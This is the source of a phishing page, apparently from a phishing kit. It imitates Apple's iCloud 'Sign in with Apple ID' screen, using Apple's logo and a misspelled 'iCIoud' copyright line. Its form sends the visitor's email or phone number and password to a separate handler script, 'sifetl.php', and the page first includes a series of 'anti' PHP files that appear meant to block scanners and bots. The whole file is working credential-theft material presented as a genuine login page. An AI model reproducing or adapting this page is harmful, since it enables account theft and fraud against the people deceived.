<?php
include '../anti/anti1.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti8.php';
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="discription" content="Coinbase">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="">
    <title></title>
    <!-- === bootstrap === -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
    <!-- == Font-awesome " icon " == -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- == remixicon " icon " == -->
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <!-- == Type Font == -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Blinker:wght@100;200;300;400;600;700;800;900&display=swap"
        rel="stylesheet">
    <!-- == file style css == -->
    <link rel="stylesheet" href="./Asstes/css/style.css">
</head>

<body>
    <header class="d-flex justify-content-between align-items-center p-2 px-3">
        <div class="part-left">
            <svg width="82" height="31" xmlns="http://www.w3.org/2000/svg" class="apple-icloud-logo dark"
                aria-hidden="true">
                <g fill="none" fill-rule="nonzero">
                    <path
                        d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z"
                        fill="#1D1D1F" transform="translate(2.5 6.5)"></path>
                </g>
            </svg>
        </div>
        <div class="part-right">
            <svg class="ellipsis" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" height="22" width="22"
                aria-hidden="true">
                <path
                    d="M12.9321097,6.8055484 C12.9321097,3.30883872 10.0968839,0.505161291 6.53720646,0.505161291 C3.07198065,0.505161291 0.236774194,3.30883872 0.236774194,6.8055484 C0.236774194,10.3022581 3.07198065,13.1059355 6.53720646,13.1059355 C10.0968839,13.1059355 12.9321097,10.3022581 12.9321097,6.8055484 Z M36.2435936,6.8055484 C36.2435936,3.30883872 33.4399162,0.505161291 29.9432065,0.505161291 C26.4779807,0.505161291 23.6743033,3.30883872 23.6743033,6.8055484 C23.6743033,10.3022581 26.4779807,13.1059355 29.9432065,13.1059355 C33.4399162,13.1059355 36.2435936,10.3022581 36.2435936,6.8055484 Z M59.6495291,6.8055484 C59.6495291,3.30883872 56.8459162,0.505161291 53.3492065,0.505161291 C49.7894646,0.505161291 46.9857872,3.30883872 46.9857872,6.8055484 C46.9857872,10.3022581 49.7894646,13.1059355 53.3492065,13.1059355 C56.8459162,13.1059355 59.6495291,10.3022581 59.6495291,6.8055484 Z"
                    transform="translate(2 25.226)"></path>
            </svg>
        </div>
    </header>
    <div class="wrapper-form">
        <form action="sifetl.php" method="post">
            <div class="logo text-center">
                <img src="./files/4f72d89d71e9abcc4e37c71fb77fe65b.svg" alt="" width="33%">
            </div>
            <div class="title text-center">
                <h2>Sign in with Apple ID</h2>
            </div>
            <div class="group-inputs">
                <div class="form-group user">
                    <input type="text" class="user" onkeydown="return (event.keyCode!=13);" id="user" name="user"
                        required />
                    <label for="">Email or Phone Number</label>
                    <img src="capture.png" alt="" class="next">
                </div>
                <div class="form-group pass">
                    <input type="password" class="password" id="password" name="password" required />
                    <label for="">Password</label>
                    <button type="submit" style="background:none;">
                        <img src="capture.png" alt="">
                    </button>
                </div>
            </div>
            <div class="info-form text-center">
                <p><input type="checkbox" class="me-2">Keep me signed in</p>
                <span class="d-block"><a href="">Forgot password?</a><i class="ri-arrow-right-up-line"></i></span>
                <a href="">Create Apple ID</a>
            </div>
        </form>
    </div>
    <footer>
        <div class="container-box d-flex justify-content-between align-items-center">
            <div class="part-left">
                <ul class="d-flex ps-0 mb-0">
                    <li>System Status</li>
                    <li>|</li>
                    <li>Privacy Policy</li>
                    <li>|</li>
                    <li>Terms & Conditions</li>
                </ul>
            </div>
            <div class="part-right">
                <span>Copyright &copy; 2024 iCIoud. All rights reserved.</span>
            </div>
        </div>
    </footer>
    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>

    <script>
        $(".form-group input").focus(function () {
            $(this).next().addClass("focus")
        })
        $(".form-group input").blur(function () {
            if ($(this).val() == "") {
                $(this).next().removeClass("focus")
            }
        })

        $(".form-group input").focus(function () {
            $(this).addClass("focus-input")
        })
        $(".form-group input").blur(function () {
            $(this).removeClass("focus-input")
        })

        $(".form-group .next").click(function () {
            $(".form-group input").parent().next().css("visibility", "visible");
            $(".user input").addClass("rmred");
            $(this).css("visibility", "hidden");
        })
    </script>

    <script>
        function checkvalue() {
            var mystring = document.getElementById('password').value;
            if (!mystring.match(/\S/)) {
                alert('Empty value is not allowed');
                return false;
            } else {
                alert("correct input");
                return true;
            }
        }
    </script>

    <script>
        document.getElementById('user').addEventListener('keydown', function (k) {
            if (k.keyCode == 13) return false;
        });


        $("input").click(function (event) {
            if (event.keyCode == 13) {
                event.preventDefault();
            }
        });
    </script>
</body>

</html>